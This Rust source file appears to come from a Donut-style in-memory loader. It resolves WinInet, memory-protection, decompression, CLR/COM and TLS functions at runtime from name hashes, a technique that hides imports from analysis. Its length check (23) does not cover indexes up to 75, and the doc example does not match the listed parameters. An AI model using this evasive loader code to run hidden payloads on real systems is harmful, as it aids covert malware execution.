#![allow(non_snake_case, non_camel_case_types)]

use azathoth_core::os::windows::dotnet::fn_defs::{CLRCreateInstance_t, CoCreateInstance_t, CoInitializeEx_t, CoUninitialize_t, CorBindToRuntime_t, CreateInterface_t, SafeArrayAccessData_t, SafeArrayCreateVector_t, SafeArrayCreate_t, SafeArrayDestroy_t, SafeArrayGetElement_t, SafeArrayGetLBound_t, SafeArrayGetUBound_t, SafeArrayPutElement_t, SafeArrayUnAccessData_t, SysAllocString_t, SysFreeString_t};
use azathoth_core::os::windows::fn_defs::{ExitProcess_t, ExitThread_t, FlushInstructionCache_t, GetLastError_t, GetModuleHandleA_t, GetProcAddress_t, GetProcessHeap_t, HeapAlloc_t, HeapFree_t, HeapReAlloc_t, HttpOpenRequestA_t, HttpQueryInfoA_t, HttpSendRequestA_t, InternetCloseHandle_t, InternetConnectA_t, InternetCrackUrlA_t, InternetOpenA_t, InternetQueryDataAvailable_t, InternetReadFile_t, InternetSetOptionA_t, LoadLibraryA_t, RtlDecompressBuffer_t, TlsAlloc_t, TlsGetValue_t, TlsSetValue_t, VirtualAlloc_t, VirtualFree_t, VirtualProtect_t};
use azathoth_libload::load_library;
use crate::errors::{DonutError, DonutResult};
use crate::platform::windows::resolve_api;

/// Wrapper for WinInet network-related functions.
///
/// This struct holds optional function pointers to commonly used HTTP and Internet API functions
/// dynamically loaded from `wininet.dll`.
#[repr(C)]
#[derive(Debug, Clone, Default)]
pub struct WebFns {
    /// Sends an HTTP request to the server.
    pub http_send_request: Option<HttpSendRequestA_t>,
    /// Opens a new HTTP request handle.
    pub http_open_request: Option<HttpOpenRequestA_t>,
    /// Queries headers or status information from an HTTP request.
    pub http_query_info: Option<HttpQueryInfoA_t>,
    /// Reads data from an open internet handle.
    pub internet_read_file: Option<InternetReadFile_t>,
    /// Connects to an HTTP server.
    pub internet_connect_a: Option<InternetConnectA_t>,
    /// Opens an internet session.
    pub internet_open_a: Option<InternetOpenA_t>,
    /// Closes an internet handle.
    pub internet_close_handle: Option<InternetCloseHandle_t>,
    /// Parses a URL into its components.
    pub internet_crack_url: Option<InternetCrackUrlA_t>,
    /// Sets an internet option on a handle.
    pub internet_set_option: Option<InternetSetOptionA_t>,
    /// Queries how much data is available for reading.
    pub internet_query_data_available: Option<InternetQueryDataAvailable_t>,
}

/// Wrapper for .NET-related COM and SafeArray functions.
///
/// This struct stores dynamically resolved pointers for interacting with the .NET CLR and COM objects,
/// including SafeArray manipulation and runtime initialization.
#[repr(C)]
#[derive(Debug, Clone, Default)]
pub struct DotnetFns {
    /// Creates an instance of the CLR.
    pub clr_create_instance: Option<CLRCreateInstance_t>,
    /// Binds to a specific version of the CLR.
    pub cor_bind_to_runtime: Option<CorBindToRuntime_t>,
    /// Creates a new COM object instance.
    pub co_create_instance: Option<CoCreateInstance_t>,
    /// Uninitializes the COM library on the current thread.
    pub co_uninitialize: Option<CoUninitialize_t>,
    /// Allocates a new BSTR string.
    pub sys_alloc_string: Option<SysAllocString_t>,
    /// Frees a BSTR string.
    pub sys_free_string: Option<SysFreeString_t>,
    /// Creates a new SafeArray.
    pub safe_array_create: Option<SafeArrayCreate_t>,
    /// Destroys a SafeArray.
    pub safe_array_destroy: Option<SafeArrayDestroy_t>,
    /// Creates a vector-based SafeArray.
    pub safe_array_create_vector: Option<SafeArrayCreateVector_t>,
    /// Retrieves the lower bound of a SafeArray dimension.
    pub safe_array_get_lbound_t: Option<SafeArrayGetLBound_t>,
    /// Retrieves the upper bound of a SafeArray dimension.
    pub safe_array_get_ubound_t: Option<SafeArrayGetUBound_t>,
    /// Inserts an element into a SafeArray.
    pub safe_array_put_element: Option<SafeArrayPutElement_t>,
    /// Initializes the COM library for use by the calling thread.
    pub co_initialize_ex: Option<CoInitializeEx_t>,
    /// Grants direct access to the data in a SafeArray.
    pub safe_array_access_data: Option<SafeArrayAccessData_t>,
    /// Revokes access to the data in a SafeArray.
    pub safe_array_un_access_data: Option<SafeArrayUnAccessData_t>,
    /// Creates a CLR interface instance.
    pub create_interface: Option<CreateInterface_t>,
    /// Retrieves an element from a SafeArray.
    pub safe_array_get_element: Option<SafeArrayGetElement_t>,
}



/// Wrapper for memory management functions.
///
/// Contains dynamically resolved pointers to functions that allocate, protect, free, and
/// manage memory in Windows processes.
#[repr(C)]
#[derive(Debug, Clone, Default)]
pub struct MemoryFns {
    /// Reserves, commits, or changes the state of a region of pages in virtual memory.
    pub virtual_alloc: Option<VirtualAlloc_t>,
    /// Changes the protection on a region of committed pages.
    pub virtual_protect: Option<VirtualProtect_t>,
    /// Releases, decommits, or frees a region of virtual memory.
    pub virtual_free: Option<VirtualFree_t>,
    /// Retrieves a handle to the default heap of the calling process.
    pub get_process_heap: Option<GetProcessHeap_t>,
    /// Allocates a block of memory from a heap.
    pub heap_alloc: Option<HeapAlloc_t>,
    /// Reallocates a block of memory from a heap.
    pub heap_re_alloc: Option<HeapReAlloc_t>,
    /// Frees a memory block allocated from a heap.
    pub heap_free: Option<HeapFree_t>,
    /// Flushes the instruction cache for a specified process.
    pub flush_instruction_cache: Option<FlushInstructionCache_t>,
    /// Decompresses a buffer using NT's built-in decompression routines.
    pub rtl_decompress_buffer: Option<RtlDecompressBuffer_t>,
}

/// Wrapper for Thread Local Storage (TLS) management functions.
///
/// Provides dynamically resolved pointers to functions for allocating and managing TLS indexes.
#[repr(C)]
#[derive(Debug, Clone, Default)]
pub struct TlsFns {
    /// Allocates a new TLS index.
    pub tls_alloc: Option<TlsAlloc_t>,
    /// Stores a value in a TLS slot.
    pub tls_set_value: Option<TlsSetValue_t>,
    /// Retrieves a value from a TLS slot.
    pub tls_get_value: Option<TlsGetValue_t>,
}

/// Aggregates all dynamically resolved Windows API function pointers.
///
/// This struct provides access to general WinAPI functions, network functions, memory management,
/// .NET runtime interaction, and thread-local storage management.
#[repr(C)]
#[derive(Debug, Clone, Default)]
pub struct WinApi {
    /// Retrieves the last system error code.
    pub get_last_error: Option<GetLastError_t>,
    /// Retrieves the address of an exported function from a loaded DLL.
    pub get_proc_address: Option<GetProcAddress_t>,
    /// Loads a specified DLL into memory.
    pub load_library: Option<LoadLibraryA_t>,
    /// Retrieves a module handle for a specified DLL.
    pub get_module_handle: Option<GetModuleHandleA_t>,
    /// Terminates the current process and all threads.
    pub exit_process: Option<ExitProcess_t>,
    /// Terminates the calling thread.
    pub exit_thread: Option<ExitThread_t>,
    /// Table of network-related functions.
    pub web_fns: WebFns,
    /// Table of memory management functions.
    pub memory_fns: MemoryFns,
    /// Table of .NET and COM interaction functions.
    pub dotnet_fns: DotnetFns,
    /// Table of TLS management functions.
    pub tls_fns: TlsFns,
}

impl WinApi {
    /// Creates a [`WinApi`] instance by resolving all required function pointers
    /// using a list of precomputed hashes and a seed value.
    ///
    /// # Parameters
    /// - `hashes`: A slice of 32-bit hashes corresponding to function and library names.
    /// - `seed`: The seed used for hash calculations.
    ///
    /// # Returns
    /// The return value of this function is a `Some(WinApi)` if all functions are successfully resolved, otherwise `None`.
    ///
    /// # Example
    /// ```
    /// # use base::platform::windows::fn_defs::WinApi;
    /// let hashes = vec![/* precomputed hashes */];
    /// let seed = 0x1234ABCD;
    /// if let Some(api) = WinApi::from_hashlist(&hashes, seed, false) {
    ///     // Use resolved APIs
    /// }
    /// ```
    pub fn from_hashlist(hashes: &[u32], seed: u32, is_dotnet: bool) -> DonutResult<Self> {
        if hashes.len() < 23 {
            return Err(DonutError::ApiResolutionFailure2(74));
        }
        unsafe {
            let kernel32 = load_library(hashes[0], &(crate::utils::globals::donut_hasher, seed)).ok_or(DonutError::ApiResolutionFailure2(75))?;
            let exit_process: ExitProcess_t = resolve_api(kernel32, hashes[50], seed);
            let exit_thread: ExitThread_t = resolve_api(kernel32, hashes[51], seed);
            let get_last_error: GetLastError_t = resolve_api(kernel32, hashes[1], seed);
            let load_library_fn: LoadLibraryA_t = resolve_api(kernel32, hashes[2], seed);
            let get_proc_address: GetProcAddress_t = resolve_api(kernel32, hashes[3], seed);
            let get_module_handle: GetModuleHandleA_t = resolve_api(kernel32, hashes[75], seed);
            let wininet = match load_library(hashes[4], &(crate::utils::globals::donut_hasher, seed)) {
                Some(lib) => {
                    lib
                }

                None => {
                    let wininet_str = [b'W',b'I',b'N',b'I',b'N',b'E',b'T'];
                    let base = load_library_fn(wininet_str.as_ptr());
                    if base.is_null() {
                        return Err(DonutError::ApiResolutionFailure2(76));
                    }
                    base as _
                }
            };
            let ntdll = match load_library(hashes[5], &(crate::utils::globals::donut_hasher, seed)) {
                Some(lib) => lib,
                None => {
                    let ntdll_str = [b'N',b'T',b'D',b'L',b'L'];
                    let base = load_library_fn(ntdll_str.as_ptr());
                    if base.is_null() {
                        return Err(DonutError::ApiResolutionFailure2(77));
                    }
                    base as _
                }
            };
            let web_fns = WebFns {
                http_send_request: resolve_api(wininet, hashes[6], seed),
                http_open_request: resolve_api(wininet, hashes[7], seed),
                http_query_info: resolve_api(wininet, hashes[8], seed),
                internet_read_file: resolve_api(wininet, hashes[9], seed),
                internet_connect_a: resolve_api(wininet, hashes[10], seed),
                internet_open_a: resolve_api(wininet, hashes[11], seed),
                internet_close_handle: resolve_api(wininet, hashes[12], seed),
                internet_crack_url: resolve_api(wininet, hashes[13], seed),
                internet_set_option: resolve_api(wininet, hashes[14], seed),
                internet_query_data_available: resolve_api(wininet, hashes[15], seed),
            };
            let memory_fns = MemoryFns {
                virtual_alloc: resolve_api(kernel32, hashes[16], seed),
                virtual_protect: resolve_api(kernel32, hashes[17], seed),
                virtual_free: resolve_api(kernel32, hashes[18], seed),
                get_process_heap: resolve_api(kernel32, hashes[19], seed),
                heap_alloc: resolve_api(kernel32, hashes[20], seed),
                heap_re_alloc: resolve_api(kernel32, hashes[21], seed),
                heap_free: resolve_api(kernel32, hashes[22], seed),
                flush_instruction_cache: resolve_api(kernel32, hashes[23], seed),
                rtl_decompress_buffer: resolve_api(ntdll, hashes[24], seed),
            };
            let dotnet_fns = if is_dotnet {
                let mscoree = match load_library(hashes[25], &(crate::utils::globals::donut_hasher, seed)) {
                    Some(lib) => lib,
                    None => {
                        let mscoree_str = [b'M',b'S',b'C',b'O',b'R',b'E',b'E'];
                        let base = load_library_fn(mscoree_str.as_ptr());
                        if base.is_null() {
                            return Err(DonutError::ApiResolutionFailure2(78));
                        }
                        base as _
                    }
                };
                let ole32 = match load_library(hashes[54], &(crate::utils::globals::donut_hasher, seed)) {
                    Some(lib) => lib,
                    None => {
                        let ole32_str =[b'O',b'L',b'E',b'3',b'2'];
                        let base = load_library_fn(ole32_str.as_ptr());
                        if base.is_null() {
                            return Err(DonutError::ApiResolutionFailure2(79));
                        }
                        base as _
                    }
                };
                let oleaut32 = match load_library(hashes[55], &(crate::utils::globals::donut_hasher, seed)) {
                    Some(lib) => lib,
                    None => {
                        let oleaut32_str = b"OLEAUT32.dll\0";
                        let base = load_library_fn(oleaut32_str.as_ptr());
                        if base.is_null() {
                            return Err(DonutError::ApiResolutionFailure2(80));
                        }
                        base as _
                    }
                };
                let safe_array_create = resolve_api(oleaut32, hashes[26], seed);
                let safe_array_create_vector = resolve_api(oleaut32, hashes[27], seed);
                let safe_array_put_element = resolve_api(oleaut32, hashes[28], seed);
                let safe_array_destroy = resolve_api(oleaut32, hashes[29], seed);
                let safe_array_get_lbound_t = resolve_api(oleaut32, hashes[30], seed);
                let safe_array_get_ubound_t = resolve_api(oleaut32, hashes[31], seed);
                let sys_alloc_string = resolve_api(oleaut32, hashes[32], seed);
                let sys_free_string = resolve_api(oleaut32, hashes[33], seed);
                let cor_bind_to_runtime = resolve_api(mscoree, hashes[34], seed);
                let clr_create_instance = resolve_api(mscoree, hashes[35], seed);
                let co_initialize_ex = resolve_api(ole32, hashes[36], seed);
                let co_create_instance = resolve_api(ole32, hashes[37], seed);
                let co_uninitialize = resolve_api(ole32, hashes[38], seed);
                let safe_array_un_access_data = resolve_api(oleaut32, hashes[68], seed);
                let safe_array_access_data = resolve_api(oleaut32, hashes[69], seed);
                let create_interface = resolve_api(mscoree, hashes[70], seed);
                let safe_array_get_element = resolve_api(oleaut32, hashes[71], seed);
                DotnetFns {
                    safe_array_create,
                    safe_array_create_vector,
                    safe_array_put_element,
                    safe_array_destroy,
                    safe_array_get_lbound_t,
                    safe_array_get_ubound_t,
                    sys_alloc_string,
                    sys_free_string,
                    cor_bind_to_runtime,
                    clr_create_instance,
                    co_initialize_ex,
                    co_create_instance,
                    co_uninitialize,
                    safe_array_un_access_data,
                    safe_array_access_data,
                    create_interface,
                    safe_array_get_element,
                }
            } else {
                DotnetFns::default()
            };


            let tls_fns = TlsFns {
                tls_alloc: resolve_api(kernel32, hashes[72], seed),
                tls_set_value: resolve_api(kernel32, hashes[73], seed),
                tls_get_value: resolve_api(kernel32, hashes[74], seed),
            };
            Ok(WinApi {
                get_last_error: Some(get_last_error),
                get_proc_address: Some(get_proc_address),
                load_library: Some(load_library_fn),
                get_module_handle: Some(get_module_handle),
                exit_process: Some(exit_process),
                exit_thread: Some(exit_thread),
                web_fns,
                memory_fns,
                dotnet_fns,
                tls_fns,
            })
        }
    }
}
